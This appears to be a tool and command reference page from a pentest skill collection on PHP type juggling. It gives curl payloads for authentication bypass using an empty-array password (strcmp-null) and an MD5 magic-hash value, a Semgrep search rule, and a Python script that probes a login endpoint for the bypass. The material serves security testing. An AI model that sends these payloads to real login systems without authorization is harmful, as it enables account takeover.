# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`type-juggling-and-loose-comparison-php-juggling`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS 'https://target.example/login' --data 'pw[]='` | Submit the password field as an empty array to trigger the strcmp-null bypass | Cross-platform |
| `curl` | `curl -sS 'https://target.example/auth' --data 'pass=QNKCDZO'` | Send a known magic-hash preimage against an MD5 loose-equality check | Cross-platform |
| `Semgrep` | `semgrep -e 'strcmp(...) == 0' --lang php .` | Locate strcmp misuse and loose equality in PHP auth code | Cross-platform |
| `php` | `php -r 'var_dump(strcmp([], "x") == 0);'` | Show locally that strcmp with an array returns null and loosely equals zero | Linux, macOS, Windows |

## Minimal Script Shape

Posts the password field as a scalar wrong value and as an empty array and reports a suspected strcmp-null bypass when the scalar is rejected but the array form is accepted.

```python
import urllib.request

ENDPOINT = "https://target.example/login"

def post_raw(body):
    req = urllib.request.Request(ENDPOINT, data=body.encode(), method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as exc:
        return exc.code

wrong = post_raw("pw=definitely-wrong")
array_form = post_raw("pw[]=")
print({"scalar_wrong_status": wrong, "array_form_status": array_form,
       "strcmp_null_bypass_suspected": wrong in (401, 403) and array_form == 200})
```
